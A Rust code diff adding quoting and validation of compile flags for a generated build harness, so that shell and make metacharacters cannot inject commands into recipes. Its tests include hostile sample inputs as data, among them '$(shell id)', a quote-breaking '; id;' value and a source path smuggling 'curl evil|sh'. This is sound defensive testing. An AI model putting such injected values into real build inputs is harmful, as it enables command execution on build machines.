@@ -79,6 +79,70 @@ fn is_quoted_define_safe(value: &str) -> bool {
         .any(|c| c.is_control() || DANGEROUS_IN_QUOTES.contains(&c))
 }
 
+/// A token that is not safe BARE but is safe once wrapped in single quotes,
+/// rendered with those quotes. `None` when it is unsafe either way, or when it
+/// needs no quoting at all (the caller then emits it unchanged).
+///
+/// `sh` treats every character inside single quotes literally, so the only shell
+/// hazard is a single quote itself. `make` expands `$` BEFORE the shell ever sees
+/// the line, so that stays forbidden, as do newlines and control characters,
+/// which no quoting can contain.
+///
+/// This is what lets a legitimate CMake define through. `-DLLAMA_VERSIONS=>=3`
+/// (gpt4all) and `-D_LIBCPP_HARDENING_MODE=..._DEBUG>` (btop) are ordinary
+/// version-comparison defines whose `>` would redirect if emitted bare — refusing
+/// them cost every target in those projects, and quoting them is both correct and
+/// safe.
+pub fn quoted_build_input(value: &str) -> Option<String> {
+    if is_build_input_safe(value) {
+        return None;
+    }
+    const UNQUOTABLE: &[char] = &['\'', '$', '\n', '\r'];
+    if value.is_empty()
+        || value
+            .chars()
+            .any(|c| c.is_control() || UNQUOTABLE.contains(&c))
+    {
+        return None;
+    }
+    Some(format!("'{value}'"))
+}
+
+/// Whether a COMPILE FLAG may be interpolated into a recipe — bare or quoted.
+///
+/// Deliberately narrower than it looks: this relaxation is for flags ONLY. A
+/// compile flag appears only inside a recipe command line, where single quotes
+/// contain it completely. A source path or include dir also appears as a make
+/// TARGET or prerequisite, where quoting does not help and a `;` or `|` breaks
+/// rule parsing outright, and an include NAME is interpolated into an
+/// `#include "..."` line in generated C. Those stay strict.
+pub fn is_compile_flag_usable(value: &str) -> bool {
+    is_build_input_safe(value) || quoted_build_input(value).is_some()
+}
+
+/// Render a compile flag for a recipe: unchanged when it is safe bare,
+/// single-quoted when it needs it. Callers must have validated it first.
+pub fn recipe_token(value: &str) -> String {
+    quoted_build_input(value).unwrap_or_else(|| value.to_owned())
+}
+
+/// Validate every compile flag, permitting one that is safe once quoted.
+pub fn ensure_all_compile_flags_safe<'a, I>(values: I) -> Result<(), HarnessGenError>
+where
+    I: IntoIterator<Item = &'a str>,
+{
+    for value in values {
+        if !is_compile_flag_usable(value) {
+            return Err(HarnessGenError::UnsafeBuildInput(format!(
+                "refusing to generate harness: compile flag {value:?} contains a shell/make \
+                 metacharacter that quoting cannot contain and could inject commands into \
+                 the build recipe"
+            )));
+        }
+    }
+    Ok(())
+}
+
 /// Validate one untrusted build-input token, returning a descriptive
 /// `UnsafeBuildInput` error when it contains a metacharacter.
 pub fn ensure_build_input_safe(kind: &str, value: &str) -> Result<(), HarnessGenError> {
@@ -155,6 +219,50 @@ mod tests {
         ] {
             assert!(!is_build_input_safe(bad), "{bad:?} should be rejected");
             assert!(ensure_build_input_safe("flag", bad).is_err());
+        }
+    }
+
+    /// A CMake version-comparison define is legitimate and its `>` would
+    /// redirect if emitted bare. Refusing it cost every target in gpt4all and
+    /// btop; single-quoting it is correct AND safe, because `sh` treats
+    /// everything inside single quotes literally.
+    #[test]
+    fn a_flag_that_is_safe_once_quoted_is_quoted_not_refused() {
+        for flag in [
+            "-DLLAMA_VERSIONS=>=3",
+            "-D_LIBCPP_HARDENING_MODE=_LIBCPP_HARDENING_MODE_DEBUG>",
+            "-DFOO=a|b",
+            "-DBAR=(x)",
+        ] {
+            assert!(!is_build_input_safe(flag), "{flag:?} is not safe bare");
+            assert!(is_compile_flag_usable(flag), "{flag:?} must be usable");
+            assert_eq!(recipe_token(flag), format!("'{flag}'"));
+            assert!(ensure_all_compile_flags_safe([flag]).is_ok());
+        }
+
+        // What quoting CANNOT contain is still refused: `make` expands `$`
+        // before the shell sees the line, a single quote ends the quoting, and
+        // a newline starts a new recipe line.
+        for flag in [
+            "-DX=y$(shell id)",
+            "-DX=${HOME}",
+            "-DX='; id; '",
+            "-DX=y\nrun: ; id",
+        ] {
+            assert!(quoted_build_input(flag).is_none(), "{flag:?}");
+            assert!(!is_compile_flag_usable(flag), "{flag:?}");
+            assert!(ensure_all_compile_flags_safe([flag]).is_err(), "{flag:?}");
+        }
+
+        // A safe-bare flag is emitted unchanged — no gratuitous quoting.
+        assert_eq!(recipe_token("-DNDEBUG"), "-DNDEBUG");
+        assert_eq!(recipe_token("-I/usr/include"), "-I/usr/include");
+
+        // The relaxation is for FLAGS only. A source path is also a make target
+        // and an include name lands inside `#include "..."`, so both stay strict
+        // even though single-quoting would satisfy the shell.
+        for hostile in ["src/a;curl evil|sh.c", "/path/with a space.c"] {
+            assert!(ensure_build_input_safe("source path", hostile).is_err());
         }
     }
 
